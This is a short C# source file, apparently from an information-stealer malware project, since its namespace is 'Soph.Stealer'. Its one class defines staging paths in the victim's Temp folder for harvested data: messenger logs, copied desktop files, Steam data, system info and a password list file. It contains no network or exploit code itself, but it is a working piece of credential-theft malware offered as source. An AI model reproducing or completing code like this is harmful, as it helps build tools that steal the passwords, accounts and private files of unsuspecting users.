using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Soph.Stealer
{
    public static class DirPath
    {
        public static readonly string DefaultPath = Environment.GetEnvironmentVariable("Temp");
        public static readonly string User_Name = Path.Combine(DefaultPath, Environment.UserName);
        public static readonly string DesktopDir = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        public static readonly string LogMessanger = Path.Combine(User_Name, "Messengers.txt");
        public static readonly string Desktop_Folder = Path.Combine(User_Name, "DesktopFiles");
        public static readonly string Steam_Folder = Path.Combine(User_Name, "Steam");
        public static readonly string PC_File = Path.Combine(User_Name, "PcInfo.html");
        public static readonly string Pass_File = Path.Combine(User_Name, "List_Password.html");
    }
}